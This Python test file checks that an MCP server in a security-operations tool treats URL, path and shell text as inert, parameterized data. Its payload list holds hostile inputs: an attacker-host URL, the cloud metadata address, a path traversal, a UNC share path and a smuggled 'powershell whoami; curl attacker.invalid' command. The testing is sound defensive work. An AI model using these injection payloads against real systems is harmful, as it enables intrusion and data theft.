"""Actual MCP registration/work with recording HTTP and SQL dependencies."""

import json
import os
import sys
from contextlib import nullcontext
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from threading import Thread
from types import SimpleNamespace

import pytest
from evidencesoc.mcp_server.context import RunContext
from evidencesoc.mcp_server.main import create_server
from evidencesoc.tools.alert_context import AlertContextTools
from evidencesoc.tools.attack import AttackTools
from evidencesoc.tools.attack_work import AttackLookupWork
from evidencesoc.tools.event_work import build_event_search_work
from evidencesoc.tools.security_events import SecurityEventTools
from sqlalchemy.dialects import postgresql


class Audit:
    def __init__(self):
        self.records = []

    def record(self, record):
        self.records.append(record)


@pytest.mark.asyncio
async def test_url_path_and_shell_text_stays_parameterized_data_at_mcp_boundary(
    tmp_path,
):
    canary = tmp_path / "task14-canary"
    canary.write_text("PRIVATE_CANARY_CONTENT", encoding="utf-8")
    payloads = [
        "http://attacker.invalid/steal",
        "http://169.254.169.254/latest/meta-data/",
        str(tmp_path / "sandbox" / ".." / "task14-canary"),
        r"\\attacker.invalid\share\task14-canary",
        r"C:\Windows\task14-canary",
        "$(powershell -c whoami); curl attacker.invalid",
    ]
    http_calls, sql_calls, effects = [], [], []

    class Handler(BaseHTTPRequestHandler):
        def log_message(self, *_args):
            pass

        def do_POST(self):
            http_calls.append(
                (
                    self.path,
                    json.loads(self.rfile.read(int(self.headers["Content-Length"]))),
                )
            )
            body = json.dumps(
                {"timed_out": False, "_shards": {"failed": 0}, "hits": {"hits": []}}
            ).encode()
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)

    class SqlSession:
        def get_bind(self):
            return SimpleNamespace(dialect=SimpleNamespace(name="sqlite"))

        def execute(self, statement):
            sql_calls.append(statement.compile(dialect=postgresql.dialect()))
            return SimpleNamespace(all=list)

    def unexpected_dependency(*_args, **_kwargs):
        raise AssertionError("empty search must not create evidence or read an alert")

    http = ThreadingHTTPServer(("127.0.0.1", 0), Handler)
    worker = Thread(target=http.serve_forever, daemon=True)
    worker.start()
    context = RunContext("AR-private", "IN-private", "TRACE-private")
    audit = Audit()
    anchors = {"source_ip": "203.0.113.42", "dataset_id": "task14-owned"}
    scope = {
        "alert_id": "AL-private",
        "time_from": "2026-09-21T10:05:00+00:00",
        "time_to": "2026-09-21T10:35:00+00:00",
        "filters": anchors,
        "source_scopes": [{"filters": anchors}],
        "limit": 5,
    }
    event_work = build_event_search_work(
        opensearch_url=f"http://127.0.0.1:{http.server_port}",
        index_name="owned-fixed-index",
        session_factory=unexpected_dependency,
        max_attempts=1,
    )
    server = create_server(
        context=context,
        boundary_audit=audit,
        event_tools=SecurityEventTools(
            context=context, work=event_work, audit=audit, incident_scope=scope
        ),
        alert_tools=AlertContextTools(
            context=context, work=unexpected_dependency, audit=audit
        ),
        attack_tools=AttackTools(
            context=context,
            audit=audit,
            work=AttackLookupWork(
                session_factory=lambda: nullcontext(SqlSession()),
                max_attempts=1,
            ),
        ),
    )
    observing = True

    def observe(event, args):
        if observing and event in {
            "socket.connect",
            "socket.getaddrinfo",
            "open",
            "subprocess.Popen",
            "os.system",
        }:
            effects.append((event, args))

    # Record attempted effects without replacing or disabling production enforcement.
    sys.addaudithook(observe)
    try:
        for payload in payloads:
            result = await server.call_tool(
                "lookup_attack_technique", {"query": payload, "limit": 3}
            )
            assert result[1] == {"result": []}
            result = await server.call_tool(
                "search_security_events",
                {
                    "time_from": scope["time_from"],
                    "time_to": scope["time_to"],
                    "filters": {**anchors, "service": payload},
                    "limit": 3,
                },
            )
            assert result[1] == {"result": []}
        for field, value in zip(
            ("url", "path", "index", "command"), payloads, strict=False
        ):
            result = await server.call_tool(
                "lookup_attack_technique", {"query": "T1190", field: value}
            )
            assert (
                result.isError
                and result.structuredContent["error"]["code"] == "POLICY_DENIED"
            )
        assert len(http_calls) == len(sql_calls) == len(payloads)
    finally:
        observing = False
        event_work._query._client.close()
        http.shutdown()
        http.server_close()
        worker.join(timeout=2)
    for payload, (path, body), sql in zip(payloads, http_calls, sql_calls, strict=True):
        assert path == "/owned-fixed-index/_search"
        clauses = body["query"]["bool"]["filter"]
        assert {"term": {"service": payload}} in clauses
        assert all({"term": {key: value}} in clauses for key, value in anchors.items())
        assert body["size"] == 3 and body["_source"] is False
        assert payload not in str(sql)
        escaped = payload.replace("\\", "\\\\").replace("%", r"\%").replace("_", r"\_")
        assert f"%{escaped}%" in sql.params.values()
    assert not [
        entry for entry in effects if entry[0] in {"subprocess.Popen", "os.system"}
    ]
    assert not [
        args
        for event, args in effects
        if event == "open" and "task14-canary" in os.fsdecode(args[0])
    ]
    assert all(
        args[1] == ("127.0.0.1", http.server_port)
        for event, args in effects
        if event == "socket.connect"
    )
    assert all(
        args[0] == "127.0.0.1"
        for event, args in effects
        if event == "socket.getaddrinfo"
    )
    assert len(audit.records) == 2 * len(payloads) + 4
    assert sum(record.error_code == "POLICY_DENIED" for record in audit.records) == 4
    assert all(record.run_id == context.run_id for record in audit.records)
    assert all(
        record.result.get("trace_id") == context.trace_id for record in audit.records
    )
    assert canary.read_text(encoding="utf-8") == "PRIVATE_CANARY_CONTENT"
